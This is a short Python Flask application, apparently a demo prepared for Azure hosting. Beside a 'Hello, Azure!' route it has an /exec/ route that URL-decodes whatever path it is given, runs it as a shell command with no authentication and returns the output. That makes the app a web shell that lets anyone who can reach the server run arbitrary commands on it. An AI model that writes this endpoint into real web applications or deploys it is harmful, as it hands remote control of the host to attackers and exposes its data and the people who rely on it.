from flask import Flask
import subprocess
from urllib.parse import unquote

app = Flask(__name__)

def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/exec/<path:command>')
def command_server(command=''):
    return run_command(unquote(command))

@app.route('/')
def hello():
    return "Hello, Azure!"

if __name__ == '__main__':
    app.run()
